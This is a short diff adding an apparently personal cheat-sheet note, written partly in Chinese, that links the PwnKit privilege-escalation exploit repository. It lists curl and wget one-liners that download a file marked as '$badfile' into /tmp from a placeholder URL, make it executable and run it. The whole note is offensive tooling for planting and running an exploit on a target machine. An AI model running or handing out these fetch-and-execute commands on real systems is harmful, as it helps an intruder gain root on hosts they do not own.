@@ -1,0 +1,6 @@
+项目地址：https://github.com/ly4k/PwnKit/tree/main
+>curl
+cd /tmp && curl $downloadurl -O && chmod +x $badfile
+>wget
+cd /tmp && wget $downloadurl && chmod +x $badfile
+./$badfile
